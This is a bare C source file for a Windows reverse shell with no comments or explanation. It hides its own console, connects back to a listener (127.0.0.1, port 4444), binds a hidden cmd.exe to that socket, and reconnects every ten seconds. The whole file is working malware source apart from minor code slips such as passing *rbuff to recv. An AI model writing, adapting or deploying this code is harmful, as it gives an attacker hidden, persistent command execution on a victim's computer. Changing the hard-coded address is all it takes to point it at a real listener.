#include <winsock2.h>
#include <stdio.h>
#include <time.h>
#pragma comment(lib, "ws2_32")
WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
boolean recon = TRUE;
char rbuff[1024];
int nReadBytes = 0;

int main(int argc, char *argv[])
{
    FreeConsole();
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    struct hostent *host;
    host = gethostbyname("127.0.0.1");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("4444"));
    hax.sin_addr.s_addr = inet_addr(ip_addr);
    conn();
    while (TRUE)
    {
        Sleep(10000);
        nReadBytes = recv(Winsock, *rbuff, 1024, 0);
        if (nReadBytes == SOCKET_ERROR)
        {
            conn();
        }
    }
}

void conn()
{
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if(WSAConnect(Winsock, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR){return;}
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);
}
